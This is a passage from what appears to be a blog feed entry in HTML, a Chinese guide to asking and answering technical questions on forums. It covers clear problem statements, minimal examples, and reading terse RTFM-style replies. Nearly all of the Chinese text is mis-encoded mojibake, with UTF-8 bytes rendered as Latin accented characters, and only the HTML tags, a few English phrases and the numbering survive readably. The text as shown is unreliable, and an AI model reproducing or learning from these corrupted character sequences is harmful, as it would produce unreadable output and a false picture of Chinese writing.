å·®å¼‚â€çš„æ–¹å¼è¯´æ˜é—®é¢˜ï¼š<strong>æ˜¯ä»€ä¹ˆæœŸæœ›ï¼Ÿå“ªé‡Œä¸å¯¹ï¼Ÿ</strong> æ¯”å¦‚ï¼šPython 3.11 asyncio é‡å¤ await å¯¼è‡´ RuntimeErrorï¼Œè€Œä¸æ˜¯â€œå¿«æ•‘æˆ‘ï¼â€</p><h4 id="å»æ‰æ— æ„ä¹‰ç»“å°¾è¯­"><a href="#å»æ‰æ— æ„ä¹‰ç»“å°¾è¯­" class="headerlink" title="å»æ‰æ— æ„ä¹‰ç»“å°¾è¯­"></a>å»æ‰æ— æ„ä¹‰ç»“å°¾è¯­</h4><p>ä¸è¦å†™â€œæœ‰æ²¡æœ‰äººèƒ½å¸®æˆ‘ï¼Ÿâ€ã€â€œæœ‰äººçœ‹æ‡‚å—ï¼Ÿâ€é‚£ä¼šè®©äººè§‰å¾—å†…å®¹ä¸ä¸“ä¸šã€‚å¥½çš„é—®é¢˜æœ¬èº«å°±å¤Ÿæ¸…æ™°ï¼Œä¸éœ€è¦è¿™ç§å¡«å……è¯­ã€‚</p><h4 id="ç¤¼è²Œæœ‰æ—¶çœŸæœ‰å¸®åŠ©"><a href="#ç¤¼è²Œæœ‰æ—¶çœŸæœ‰å¸®åŠ©" class="headerlink" title="ç¤¼è²Œæœ‰æ—¶çœŸæœ‰å¸®åŠ©"></a>ç¤¼è²Œæœ‰æ—¶çœŸæœ‰å¸®åŠ©</h4><p>è¯´â€œè¯·â€ä¸â€œè°¢è°¢â€ï¼Œè¯´æ˜ä½ å°Šé‡åˆ«äººçš„æ—¶é—´ã€‚ç¤¼è²Œä¸ä¼šä»£æ›¿å†…å®¹ï¼Œä½†æ°å½“è¡¨è¾¾æ„Ÿè°¢æ›´èƒ½èµ¢å¾—å¥½æ„Ÿï¼Œä¸ºä½ ä¸‹ä¸€æ¬¡æé—®åŠ åˆ†ã€‚</p><h3 id="2-3-å†…å®¹æ¸…æ™°ï¼Œç»“æ„åˆç†ï¼ˆæé—®æ—¶çš„å†…å®¹ç»„ç»‡ï¼‰"><a href="#2-3-å†…å®¹æ¸…æ™°ï¼Œç»“æ„åˆç†ï¼ˆæé—®æ—¶çš„å†…å®¹ç»„ç»‡ï¼‰" class="headerlink" title="2.3 å†…å®¹æ¸…æ™°ï¼Œç»“æ„åˆç†ï¼ˆæé—®æ—¶çš„å†…å®¹ç»„ç»‡ï¼‰"></a>2.3 å†…å®¹æ¸…æ™°ï¼Œç»“æ„åˆç†ï¼ˆæé—®æ—¶çš„å†…å®¹ç»„ç»‡ï¼‰</h3><h4 id="è¯­è¨€è¦æ¸…æ™°è§„èŒƒ"><a href="#è¯­è¨€è¦æ¸…æ™°è§„èŒƒ" class="headerlink" title="è¯­è¨€è¦æ¸…æ™°è§„èŒƒ"></a>è¯­è¨€è¦æ¸…æ™°è§„èŒƒ</h4><p>è®¤çœŸæ³¨æ„æ‹¼å†™ã€æ ‡ç‚¹ã€å¤§å°å†™ï¼Œåˆ«å…¨å¤§å†™ã€åˆ«ç”¨ç«æ˜Ÿæ–‡ã€‚è‹¥åœ¨è‹±æ–‡å¹³å°æé—®æ—¶ï¼Œå°½é‡ç”¨è‹±è¯­ï¼Œå¹¶å¯ä»¥æ³¨æ˜ï¼šâ€œEnglish is not my native language; please excuse typos.â€</p><p>è¿™æ ·æ—¢è¡¨ç°å°Šé‡ï¼Œä¹Ÿè®©äººæ›´æ„¿æ„å¸®åŠ©ä½ ã€‚</p><h4 id="æŒ‰æ—¶é—´é¡ºåºå†™é—®é¢˜è¿‡ç¨‹"><a href="#æŒ‰æ—¶é—´é¡ºåºå†™é—®é¢˜è¿‡ç¨‹" class="headerlink" title="æŒ‰æ—¶é—´é¡ºåºå†™é—®é¢˜è¿‡ç¨‹"></a>æŒ‰æ—¶é—´é¡ºåºå†™é—®é¢˜è¿‡ç¨‹</h4><p>æŠŠä»å¼€å§‹åˆ°å‡ºé—®é¢˜æ•´ä¸ªè¿‡ç¨‹æŒ‰é¡ºåºå†™æ¸…æ¥šã€‚æ—¥å¿—ï¼å‘½ä»¤è¡Œè®°å½•æˆªå‡ è¡Œé‡ç‚¹ï¼ŒåŠ ä¸Šæ—¶é—´çº¿è¯´æ˜ï¼Œè¿™æ ·åˆ«äººæ‰èƒ½å¿«é€Ÿå®šä½é—®é¢˜èŠ‚ç‚¹ã€‚</p><h4 id="å…ˆè¯´ç›®æ ‡ï¼Œå†è¯´ä½ å¡åœ¨å“ªä¸€æ­¥"><a href="#å…ˆè¯´ç›®æ ‡ï¼Œå†è¯´ä½ å¡åœ¨å“ªä¸€æ­¥" class="headerlink" title="å…ˆè¯´ç›®æ ‡ï¼Œå†è¯´ä½ å¡åœ¨å“ªä¸€æ­¥"></a>å…ˆè¯´ç›®æ ‡ï¼Œå†è¯´ä½ å¡åœ¨å“ªä¸€æ­¥</h4><p>ä¸è¦åªè´´è¿‡ç¨‹ã€‚æ¯”å¦‚ä¸æ˜¯é—®â€œæˆ‘æ€ä¹ˆå†™ä»£ç â€ï¼Œè€Œæ˜¯åœ¨å¼€å¤´å†™ä½ æƒ³å®ç°çš„ç›®æ ‡ï¼Œå†è¯´æ˜ä½ å¡åœ¨å“ªä¸ªæ­¥éª¤ï¼Œè¿™æ ·åˆ«äººæ›´å®¹æ˜“å¸®ä½ ã€‚</p><h4 id="é—®é¢˜éœ€æ±‚å†™æ¸…æ¥š"><a href="#é—®é¢˜éœ€æ±‚å†™æ¸…æ¥š" class="headerlink" title="é—®é¢˜éœ€æ±‚å†™æ¸…æ¥š"></a>é—®é¢˜éœ€æ±‚å†™æ¸…æ¥š</h4><p>æ˜ç¡®è¯´æ˜ä½ æƒ³è®©åˆ«äººåšä»€ä¹ˆï¼šæ˜¯ç»™æ€è·¯ã€çœ‹ä»£ç ã€æ£€æŸ¥è¡¥ä¸ï¼Œè¿˜æ˜¯æä¾›è°ƒè¯•å»ºè®®ï¼Ÿè¶Šå…·ä½“è¶Šå¥½ã€‚éœ€è¦æ€è€ƒæ–¹å‘æ¯”ç›´æ¥è¦è§£å†³æ–¹æ¡ˆæ›´å®¹æ˜“è·å¾—å¸®åŠ©ã€‚</p><h3 id="2-4-å±•ç¤ºæ€è€ƒï¼Œé™ä½æˆæœ¬ï¼ˆä¾¿äºä»–äººç†è§£å¹¶æä¾›å¸®åŠ©ï¼‰"><a href="#2-4-å±•ç¤ºæ€è€ƒï¼Œé™ä½æˆæœ¬ï¼ˆä¾¿äºä»–äººç†è§£å¹¶æä¾›å¸®åŠ©ï¼‰" class="headerlink" title="2.4 å±•ç¤ºæ€è€ƒï¼Œé™ä½æˆæœ¬ï¼ˆä¾¿äºä»–äººç†è§£å¹¶æä¾›å¸®åŠ©ï¼‰"></a>2.4 å±•ç¤ºæ€è€ƒï¼Œé™ä½æˆæœ¬ï¼ˆä¾¿äºä»–äººç†è§£å¹¶æä¾›å¸®åŠ©ï¼‰</h3><h4 id="è®©åˆ«äººå®¹æ˜“å›å¤"><a href="#è®©åˆ«äººå®¹æ˜“å›å¤" class="headerlink" title="è®©åˆ«äººå®¹æ˜“å›å¤"></a>è®©åˆ«äººå®¹æ˜“å›å¤</h4><p><strong>åˆ«è®©å›ç­”è€…è´¹åŠ²</strong>ã€‚ä¸è¦æœ€åå†™â€œç§ä¿¡æˆ‘å›å¤åœ°å€â€æˆ–â€œè¯·å‘é‚®ä»¶ç»™æˆ‘â€ï¼Œè®ºå›é‡Œäººå¤šï¼Œé»˜è®¤å›å¤å³å¯ã€‚å‘å¸–åå¦‚æœéœ€è¦å›å¤æé†’ï¼Œç›´æ¥ä½¿ç”¨â€œè¿½è¸ªâ€åŠŸèƒ½å³å¯ã€‚</p><h4 id="é”™è¯¯æè¿°è¦å…·ä½“ã€æœ‰ç”¨"><a href="#é”™è¯¯æè¿°è¦å…·ä½“ã€æœ‰ç”¨" class="headerlink" title="é”™è¯¯æè¿°è¦å…·ä½“ã€æœ‰ç”¨"></a>é”™è¯¯æè¿°è¦å…·ä½“ã€æœ‰ç”¨</h4><p>åˆ—å‡ºä½ çš„æ“ä½œæ­¥éª¤ã€ç¯å¢ƒä¿¡æ¯ã€æŠ¥é”™æ—¥å¿—ï¼Œå¹¶è¯´æ˜ä½ è¿›è¡Œè¿‡å“ªäº›è°ƒæŸ¥å’Œå°è¯•ã€‚è¿™è®©åˆ«äººå¯ä»¥å¿«é€Ÿå®šä½é—®é¢˜ï¼Œå¹¶å‡†ç¡®å›ç­”ã€‚æœ€å¥½èƒ½æä¾›å¯ä»¥<strong>é‡ç°é—®é¢˜</strong>çš„æ­¥éª¤æˆ–ä»£ç ç‰‡æ®µã€‚</p><h4 id="ç²¾ç‚¼ä¿¡æ¯ï¼Œä¸è¦å†—é•¿å †ç Œ"><a href="#ç²¾ç‚¼ä¿¡æ¯ï¼Œä¸è¦å†—é•¿å †ç Œ" class="headerlink" title="ç²¾ç‚¼ä¿¡æ¯ï¼Œä¸è¦å†—é•¿å †ç Œ"></a>ç²¾ç‚¼ä¿¡æ¯ï¼Œä¸è¦å†—é•¿å †ç Œ</h4><p>è´´å‡ºé—®é¢˜æ—¶ï¼Œä¸éœ€è¦æŠŠä¸€å¤§å †å†…å®¹éƒ½è´´ä¸Šå»ã€‚ç²¾ç®€åˆ°èƒ½å±•ç¤ºé—®é¢˜æ ¸å¿ƒï¼Œæ—¢è¡¨æ˜ä½ åšäº†åŠŸè¯¾ï¼Œåˆå¸®åŠ©åˆ«äººç†è§£é‡ç‚¹ã€‚ç¼©å°é—®é¢˜èŒƒå›´å¾€å¾€è‡ªå·±ä¹Ÿèƒ½æ‰¾åˆ°ç­”æ¡ˆã€‚</p><h4 id="åˆ«æ€¥ç€è¯´â€œè¿™æ˜¯ä¸ª-Bugâ€"><a href="#åˆ«æ€¥ç€è¯´â€œè¿™æ˜¯ä¸ª-Bugâ€" class="headerlink" title="åˆ«æ€¥ç€è¯´â€œè¿™æ˜¯ä¸ª Bugâ€"></a>åˆ«æ€¥ç€è¯´â€œè¿™æ˜¯ä¸ª Bugâ€</h4><p>é™¤éä½ èƒ½æä¾›ä»£ç  patch æˆ–å›å½’æµ‹è¯•è¯æ˜è¿™ä¸ªé—®é¢˜æ˜¯è½¯ä»¶æœ¬èº«çš„ç¼ºé™·ï¼Œå¦åˆ™å…ˆæŠŠé—®é¢˜å½“ä½ è‡ªå·±å†™é”™æˆ–é…ç½®æœ‰è¯¯æ¥çœ‹å¾…ã€‚å³ä½¿ä½ åæ¥å‘ç°çœŸæ˜¯ bugï¼Œç¤¼è²Œä¸€ç‚¹ä¹Ÿæ¯”å†’çŠ¯ç»´æŠ¤è€…å¼ºã€‚</p><h4 id="ä¸è¦å‘å¾®ä¹æ±‚å¼æé—®"><a href="#ä¸è¦å‘å¾®ä¹æ±‚å¼æé—®" class="headerlink" title="ä¸è¦å‘å¾®ä¹æ±‚å¼æé—®"></a>ä¸è¦å‘å¾®ä¹æ±‚å¼æé—®</h4><p>â€œæˆ‘åªæ˜¯ä¸ªèœé¸Ÿï¼Œæ±‚æ±‚ä½ å¸®æˆ‘â€¦â€è¿™æ ·çš„è¯­æ°”æ—¢æ²¡æ•ˆç‡ï¼Œä¹Ÿä¸æ˜“èµ¢å¾—å–„æ„ã€‚ä¸å…¶å‘å¾®ï¼Œä¸å¦‚æ¸…æ¥šæè¿°èƒŒæ™¯ã€å‡ºé—®é¢˜çš„åœ°æ–¹ï¼Œè®©åˆ«äººè§‰å¾—ä½ æ˜¯è®¤çœŸçš„ã€‚</p><h4 id="æè¿°äº‹å®ç—‡çŠ¶ï¼Œåˆ«ä¸‹ç»“è®º"><a href="#æè¿°äº‹å®ç—‡çŠ¶ï¼Œåˆ«ä¸‹ç»“è®º" class="headerlink" title="æè¿°äº‹å®ç—‡çŠ¶ï¼Œåˆ«ä¸‹ç»“è®º"></a>æè¿°äº‹å®ç—‡çŠ¶ï¼Œåˆ«ä¸‹ç»“è®º</h4><p>åˆ«æŠŠä½ çš„çŒœæµ‹å½“ä½œé—®é¢˜æœ¬èº«ã€‚é‡åˆ°é”™è¯¯æ—¶ï¼Œåªè¯´â€œå‘ç”Ÿäº†ä»€ä¹ˆâ€ï¼ŒæŠŠç»“è®ºç•™ç»™å›ç­”è€…ã€‚å¦‚æœä½ ä¸€å®šè¦è®²æ¨æµ‹ï¼Œä¹Ÿè¯·æ³¨æ˜â€œè¿™åªæ˜¯æˆ‘çš„çŒœæµ‹â€å¹¶è§£é‡Šä¸ºä»€ä¹ˆä½ è¿™ä¹ˆæƒ³ã€‚</p><h4 id="è¯¢é—®ä»£ç é—®é¢˜æ—¶ï¼šä¸€å®šè´´æœ€ç®€ç¤ºä¾‹"><a href="#è¯¢é—®ä»£ç é—®é¢˜æ—¶ï¼šä¸€å®šè´´æœ€ç®€ç¤ºä¾‹" class="headerlink" title="è¯¢é—®ä»£ç é—®é¢˜æ—¶ï¼šä¸€å®šè´´æœ€ç®€ç¤ºä¾‹"></a>è¯¢é—®ä»£ç é—®é¢˜æ—¶ï¼šä¸€å®šè´´æœ€ç®€ç¤ºä¾‹</h4><p>è´´å‡ åè¡Œï¼Œè¯´æ˜ç¬¬å‡ è¡ŒæœŸæœ›ä»€ä¹ˆï¼Œå®é™…æ˜¯ä»€ä¹ˆï¼Œé…ä¸€ä¸ªæœ€ç®€å¯å¤ç°çš„ä»£ç æ®µã€‚å¦‚æœä½ æƒ³åˆ«äºº review æŸå—ä»£ç ï¼Œä¹Ÿè¯·åœ¨å¼€å¤´æ³¨æ˜ç‰¹åˆ«å…³æ³¨å“ªä¸€éƒ¨åˆ†ã€‚</p><h4 id="å®¶åº­ä½œä¸šé¢˜åˆ«ç›´æ¥è´´"><a href="#å®¶åº­ä½œä¸šé¢˜åˆ«ç›´æ¥è´´" class="headerlink" title="å®¶åº­ä½œä¸šé¢˜åˆ«ç›´æ¥è´´"></a>å®¶åº­ä½œä¸šé¢˜åˆ«ç›´æ¥è´´</h4><p>å¦‚æœä½ è§‰å¾—è¿™æ˜¯ä½œä¸šé¢˜ï¼Œå…ˆæƒ³åŠæ³•è‡ªå·±åšå†å‘ã€‚åœ¨æé—®æ—¶ä½ å¯ä»¥è¯·æ±‚â€œæç¤ºæ–¹å‘â€æˆ–â€œæ£€æŸ¥æ€è·¯â€ï¼Œè€Œä¸æ˜¯ç›´æ¥æ±‚ç­”æ¡ˆã€‚</p><h3 id="2-5-å–„å§‹å–„ç»ˆï¼ˆæé—®åçš„è‰¯å¥½ä¹ æƒ¯ï¼‰"><a href="#2-5-å–„å§‹å–„ç»ˆï¼ˆæé—®åçš„è‰¯å¥½ä¹ æƒ¯ï¼‰" class="headerlink" title="2.5 å–„å§‹å–„ç»ˆï¼ˆæé—®åçš„è‰¯å¥½ä¹ æƒ¯ï¼‰"></a>2.5 <strong>å–„å§‹å–„ç»ˆ</strong>ï¼ˆæé—®åçš„è‰¯å¥½ä¹ æƒ¯ï¼‰</h3><p>å¦‚æœä½ çš„é—®é¢˜è¢«è§£å†³äº†ï¼Œè®°å¾—åœ¨åŸå¸–ä¸Šè¡¥ä¸€å¥ï¼šâ€œé—®é¢˜å·²è§£å†³ï¼ŒåŸå› æ˜¯â€¦æ„Ÿè°¢å¤§å®¶ï¼â€è¿™æ ·æ—¢å¯¹å¸®åŠ©è¿‡ä½ çš„äººè¡¨è¾¾è°¢æ„ï¼Œä¹Ÿè®©åæ¥è€…å¿«é€Ÿè¯†åˆ«æ— é¡»é‡å¤è§£å†³ã€‚</p><p>æ€»ä¹‹ï¼Œä¸€ä¸ªå¥½çš„æé—®ä¸æ˜¯ç®€å•åœ°â€œå‘é—®â€ï¼Œè€Œæ˜¯ç»è¿‡æ€è€ƒä¸å‡†å¤‡çš„â€œæ€è€ƒè¾“å‡ºâ€ã€‚æé—®å‰å¤šèŠ±ç‚¹å¿ƒæ€ï¼Œä½ ä¼šæ›´å®¹æ˜“è·å¾—å¸®åŠ©ï¼Œä¹Ÿä¼šè¢«æ›´å¤šäººå°Šé‡ã€‚</p><h2 id="0x03-æé—®åï¼šå†·é™è§£è¯»ã€å¸æ”¶åé¦ˆ"><a href="#0x03-æé—®åï¼šå†·é™è§£è¯»ã€å¸æ”¶åé¦ˆ" class="headerlink" title="0x03 æé—®åï¼šå†·é™è§£è¯»ã€å¸æ”¶åé¦ˆ"></a>0x03 æé—®åï¼šå†·é™è§£è¯»ã€å¸æ”¶åé¦ˆ</h2><h3 id="3-1-å­¦ä¼šâ€œè¯»æ‡‚â€åˆ«äººæ€ä¹ˆå›ç­”ä½ "><a href="#3-1-å­¦ä¼šâ€œè¯»æ‡‚â€åˆ«äººæ€ä¹ˆå›ç­”ä½ " class="headerlink" title="3.1 å­¦ä¼šâ€œè¯»æ‡‚â€åˆ«äººæ€ä¹ˆå›ç­”ä½ "></a>3.1 å­¦ä¼šâ€œè¯»æ‡‚â€åˆ«äººæ€ä¹ˆå›ç­”ä½ </h3><p>ä½ å¯èƒ½ä¼šçœ‹åˆ°ä¸€äº›ç®€çŸ­åˆè®©äººæŠ“ç‹‚çš„å›å¤ï¼Œæ¯”å¦‚ï¼š</p><ul><li>è‡ªå·±è¯»æ‰‹å†Œå»ï¼ˆRead The Fucking Manualï¼Œç®€ç§° RTFMï¼‰</li><li>è‡ªå·±ä¸Šç½‘æœï¼ˆSearch The Fucking Webï¼Œç®€ç§° STFWï¼‰</li></ul><p>è¯´ç™½äº†ï¼Œå°±æ˜¯å¯¹æ–¹è§‰å¾—ï¼š<strong>â€œè¿™é—®é¢˜å¤ªåŸºç¡€äº†ï¼Œç½‘ä¸Šéšä¾¿ä¸€æœã€çœ‹ä¸‹æ–‡æ¡£å°±æœ‰ç­”æ¡ˆã€‚â€</strong></p><p>è™½ç„¶å¬èµ·æ¥æœ‰ç‚¹ç²—é²ï¼Œä½†å…¶å®è¿™ç±»äººé€šå¸¸è¿˜ä¼šè´´ä¸Šé“¾æ¥æˆ–è¯´æ˜ä¹¦ç« èŠ‚ï¼Œè¯´æ˜ä»–ä¸æ˜¯åœ¨æ•·è¡ä½ ï¼Œè€Œæ˜¯å¸Œæœ›ä½ <strong>å…ˆåŠ¨è„‘å†åŠ¨å˜´</strong>ï¼Œç‹¬ç«‹è§£å†³é—®é¢˜ã€‚</p><p>ä»–ä»¬è¿™æ ·åšï¼Œå…¶å®æ˜¯åœ¨â€œç¡¬æ ¸åœ°â€å¸®åŠ©ä½ æˆé•¿ã€‚</p><h3 id="3-2-å¦‚æœä½ çœ‹ä¸æ‡‚ä»–ä»¬è¯´çš„æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#3-2-å¦‚æœä½ çœ‹ä¸æ‡‚ä»–ä»¬è¯´çš„æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="3.2 å¦‚æœä½ çœ‹ä¸æ‡‚ä»–ä»¬è¯´çš„æ˜¯ä»€ä¹ˆï¼Ÿ"></a>3.2 å¦‚æœä½ çœ‹ä¸æ‡‚ä»–ä»¬è¯´çš„æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>åˆ«æ€¥ç€å›ä¸€å¥ï¼šâ€œè¿™å•¥æ„æ€å•Šï¼Ÿâ€  </p><p>æ­£ç¡®çš„åšæ³•æ˜¯ï¼š</p><ol><li>è‡ªå·±å…ˆæœä¸€ä¸‹å…³é”®è¯ï¼›</li><li>æŸ¥æŸ¥ç›¸å…³æ–‡æ¡£ã€è®ºå›å†å²è´´ï¼›</li><li>å®åœ¨ä¸æ‡‚ï¼Œå†å…·ä½“é—®ï¼</li></ol><p>æ¯”å¦‚åˆ«äººè¯´ï¼šâ€œä½ å¯èƒ½æ˜¯ zentry é”ä½äº†ï¼Œå…ˆæ¸…ä¸€ä¸‹ã€‚â€  </p><p>ä½ åˆ«ç›´æ¥é—®ï¼šâ€œzentry æ˜¯å•¥ï¼Ÿâ€  </p><p>ä½ å¯ä»¥è¯´ï¼šâ€œæˆ‘çœ‹äº†ä¸‹æ–‡æ¡£ï¼Œåªçœ‹åˆ° -z å’Œ -p æåˆ° zentryï¼Œä½†æ²¡è®²æ¸…æ¥šæ€ä¹ˆæ¸…é™¤ï¼Œæ˜¯æŒ‡è¿™ä¸ªå—ï¼Ÿâ€</p><p><strong>è¡¨ç°å‡ºä½ åŠªåŠ›äº†ï¼Œå¯¹æ–¹æ‰æ›´æ„¿æ„å¸®ä½ ã€‚</strong></p><h3 id="3-3-é¢å¯¹â€œçœ‹èµ·æ¥â€æ— ç¤¼çš„å›ç­”"><a href="#3-3-é¢å¯¹â€œçœ‹èµ·æ¥â€æ— ç¤¼çš„å›ç­”" class="headerlink" title="3.3 é¢å¯¹â€œçœ‹èµ·æ¥â€æ— ç¤¼çš„å›ç­”"></a>3.3 é¢å¯¹â€œçœ‹èµ·æ¥â€æ— ç¤¼çš„å›ç­”</h3><p>æŠ€æœ¯åœˆçš„æ°›å›´åç›´æ¥ã€æ•ˆç‡å¯¼å‘ï¼Œä¸å¤ªè®²ç©¶â€œæ¸©æŸ”â€ã€‚  </p><p>å¾ˆå¤šæ—¶å€™ï¼Œé‚£äº›çœ‹èµ·æ¥å‡¶å·´å·´çš„å›å¤ï¼Œå…¶å®åªæ˜¯å¸Œæœ›äº‹æƒ…èƒ½å¿«ç‚¹æå®šï¼Œè€Œä¸æ˜¯æ•…æ„æ€¼ä½ ã€‚</p><p>å¦‚æœä½ è§‰å¾—è¢«å†’çŠ¯äº†ï¼Œå…ˆå†·é™ä¸‹æ¥ã€‚</p><p>ä½†ï¼å¦‚æœæœ‰äººçœŸçš„è¨€è¯­æ”»å‡»ä½ ï¼Œä¹Ÿåˆ«å¿ç€ï¼Œæ€¼å›å»ä¹Ÿè¡Œã€‚ä½†å‰ææ˜¯ä½ ç¡®å®šå¯¹æ–¹ç¡®å®æ— ç†ï¼Œåˆ«æŠŠæŠ€æœ¯äº¤æµå˜æˆå£æ°´æˆ˜ã€‚</p><p>æ€»ä¹‹ï¼Œå¦‚æœä½ ä¸æ˜¯é»‘å®¢ï¼Œä½ å¯èƒ½ä¼šè§‰å¾—ä»–ä»¬è„‘å­ä¸å¤ªæ­£å¸¸ã€‚ä½†è¯´å®è¯ï¼Œä»–ä»¬è‡ªå·±ä¹Ÿè§‰å¾—æ²¡å•¥æ¯›ç—…ã€‚ä»–ä»¬æ›´å…³å¿ƒé—®é¢˜èƒ½ä¸èƒ½æå®šï¼Œè€Œä¸æ˜¯ä½ èˆ’ä¸èˆ’æœã€‚</p><h3 id="3-4-é¿å…æ‰®æ¼”å¤±è´¥è€…"><a href="#3-4-é¿å…æ‰®æ¼”å¤±è´¥è€…" class="headerlink" title="3.4 é¿å…æ‰®æ¼”å¤±è´¥è€…"></a>3.4 é¿å…æ‰®æ¼”å¤±è´¥è€…</h3><ul><li>è¢«æŒ‡è´£æˆ–è¨€è¯­æ”»å‡»æ—¶ï¼Œåˆ«å“­è¯‰ã€å«åš·ã€æŠ•è¯‰æˆ–å¨èƒã€‚</li><li>å…¬å¼€æ‰¹è¯„æ˜¯ç¤¾åŒºç»´æŠ¤è´¨é‡çš„æ‰‹æ®µï¼Œæ¥å—æ‰¹è¯„æ˜¯æˆé•¿çš„è¿‡ç¨‹ã€‚</li><li>é«˜ç¤¼èŠ‚ç¦è¨€æ‰¹è¯„åªä¼šè®©ç¤¾åŒºå˜å¾—æ— ç”¨ã€‚</li><li>ä½ è¯¥é€‰æ‹©çš„æ˜¯â€œå‹å–„â€è¿˜æ˜¯â€œæœ‰ç”¨â€ï¼Ÿåˆ«æŠŠä¸¤è€…æ··ä¸ºä¸€è°ˆã€‚</li><li>è¢«æ‰¹è¯„æ˜¯å…³å¿ƒä½ å’Œç¤¾åŒºçš„è¡¨ç°ï¼Œè‡³å°‘è¡¨ç°å‡ºå°Šä¸¥å’Œæ„Ÿè°¢ã€‚</li></ul><h3 id="3-5-è¯†åˆ«æ— ç†æ”»å‡»ä¸é¿å…å£æ°´æˆ˜"><a href="#3-5-è¯†åˆ«æ— ç†æ”»å‡»ä¸é¿å…å£æ°´æˆ˜" class="headerlink" title="3.5 è¯†åˆ«æ— ç†æ”»å‡»ä¸é¿å…å£æ°´æˆ˜"></a>3.5 è¯†åˆ«æ— ç†æ”»å‡»ä¸é¿å…å£æ°´æˆ˜</h3><ul><li>æœ‰æ—¶ä¼šé‡åˆ°æ— ç¼˜æ— æ•…çš„æŒ‘è¡…ï¼Œåˆ«æ”¾åœ¨å¿ƒä¸Šã€‚</li><li>ä¸è¦å·å…¥æ— æ„ä¹‰çš„äº‰åµï¼Œé™¤éå¯¹æ–¹æœ‰æ˜ç¡®æ¶æ„ä¸”ä½ å‡†å¤‡å¥½åå‡»ã€‚</li><li>è®°ä½é»‘å®¢ç¤¾åŒºé£æ ¼ç›´æ¥ã€åŠ¡å®ï¼Œä¸å¿…æœŸå¾…æ¸©æƒ…è„‰è„‰ã€‚</li></ul><h3 id="3-6-è ¢é—®é¢˜ç¤ºä¾‹åŠå…¶èƒŒåçš„åŸå› "><a href="#3-6-è ¢é—®é¢˜ç¤ºä¾‹åŠå…¶èƒŒåçš„åŸå› " class="headerlink" title="3.6 è ¢é—®é¢˜ç¤ºä¾‹åŠå…¶èƒŒåçš„åŸå› "></a>3.6 è ¢é—®é¢˜ç¤ºä¾‹åŠå…¶èƒŒåçš„åŸå› </h3><ul><li>ä¸åšæœç´¢ç›´æ¥é—®â€œåœ¨å“ªæ‰¾ Xï¼Ÿâ€ã€â€œæ€ä¹ˆç”¨ X åš Yï¼Ÿâ€ç­‰ä½æ•ˆé—®é¢˜ã€‚</li><li>è¯¸å¦‚â€œæˆ‘çš„ç¨‹åºæ²¡ç”¨â€ã€â€œWindows æœ‰é—®é¢˜â€ç­‰æ¨¡ç³Šé—®é¢˜ç¼ºä¹ä¿¡æ¯ä¸”éš¾ä»¥å›ç­”ã€‚</li><li>æƒ³è¦â€œç ´è§£â€æˆ–â€œé»‘åˆ«äººâ€çš„é—®é¢˜å®Œå…¨ä¸å¯æ¥å—ã€‚</li></ul><h3 id="3-7-èªæ˜æé—®çš„ç‰¹ç‚¹"><a href="#3-7-èªæ˜æé—®çš„ç‰¹ç‚¹" class="headerlink" title="3.7 èªæ˜æé—®çš„ç‰¹ç‚¹"></a>3.7 èªæ˜æé—®çš„ç‰¹ç‚¹</h3><ul><li>è¯´æ˜å·²åšè¿‡çš„è°ƒæŸ¥ï¼ˆæ¯”å¦‚æœç´¢ã€çœ‹è¿‡æ‰‹å†Œã€FAQï¼‰ã€‚</li><li>æä¾›ç¯å¢ƒã€é”™è¯¯æ—¥å¿—ã€å…·ä½“ç»†èŠ‚ã€‚</li><li>è¯šå®ä¸æ¨è´£ï¼Œæ€åº¦è°¦è™šã€‚</li><li>ç»™å‡ºå…·ä½“ç¤ºä¾‹ï¼Œè¡¨ç°å‡ºè§£å†³é—®é¢˜çš„èƒ½åŠ›ã€‚</li></ul><h3 id="3-8-å¦‚æœæ²¡å¾—åˆ°å›ç­”æ€ä¹ˆåŠ"><a href="#3-8-å¦‚æœæ²¡å¾—åˆ°å›ç­”æ€ä¹ˆåŠ" class="headerlink" title="3.8 å¦‚æœæ²¡å¾—åˆ°å›ç­”æ€ä¹ˆåŠ"></a>3.8 å¦‚æœæ²¡å¾—åˆ°å›ç­”æ€ä¹ˆåŠ</h3><ul><li>è€å¿ƒç­‰å¾…ï¼Œè€ƒè™‘æ—¶åŒºå·®å¼‚å’Œæé—®çš„è´¨é‡ã€‚</li><li>é¿å…é‡å¤å‘å¸–æˆ–å–§å“—ã€‚</li><li>å¯»æ‰¾å…¶ä»–é€‚åˆåˆå­¦è€…çš„å¸®åŠ©æ¸ é“å’Œæœ¬åœ°ç”¨æˆ·ç»„ã€‚</li><li>å•†ä¸šæŠ€æœ¯æ”¯æŒè™½ç„¶æ”¶è´¹ä½†å¸¸å¸¸æ›´æœ‰æ•ˆã€‚</li></ul><h2 id="0x04-å¦‚ä½•æ›´å¥½åœ°å›ç­”åˆ«äººé—®é¢˜"><a href="#0x04-å¦‚ä½•æ›´å¥½åœ°å›ç­”åˆ«äººé—®é¢˜" class="headerlink" title="0x04 å¦‚ä½•æ›´å¥½åœ°å›ç­”åˆ«äººé—®é¢˜"></a>0x04 å¦‚ä½•æ›´å¥½åœ°å›ç­”åˆ«äººé—®é¢˜</h2><ul><li>æ€åº¦å’Œå–„ï¼Œé¿å…å…¬å¼€ç¾è¾±åˆçŠ¯ã€‚</li><li>ä¸ç¡®å®šæ—¶å¦è¯šè¯´æ˜ï¼Œä¸ä¹±æŒ‡è·¯ã€‚</li><li>ä¸å¼€ç©ç¬‘è¯¯å¯¼ï¼Œå°Šé‡æé—®è€…ã€‚</li><li>é€‚å½“åé—®ï¼Œå¼•å¯¼æé—®è€…æä¾›æ›´å¤šä¿¡æ¯ã€‚</li><li>å³ä½¿è¯´â€œRTFMâ€ï¼Œæœ€å¥½ç»™å‡ºå…·ä½“æ–‡æ¡£æˆ–æœç´¢å»ºè®®ã€‚</li><li>ç»™å‡ºæœ‰å»ºè®¾æ€§çš„ç­”æ¡ˆï¼Œæ¨èå¥½å·¥å…·å’Œæ–¹æ³•ã€‚</li><li>å¸®åŠ©ç¤¾åŒºå°†å¥½çš„ç­”æ¡ˆå†™å…¥ FAQï¼Œå‡å°‘é‡å¤ã€‚</li><li>æˆäººä»¥æ¸”ï¼Œå±•ç¤ºæ€è€ƒå’Œè§£å†³é—®é¢˜çš„æ€è·¯ã€‚</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>æ•ˆç‡æå‡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
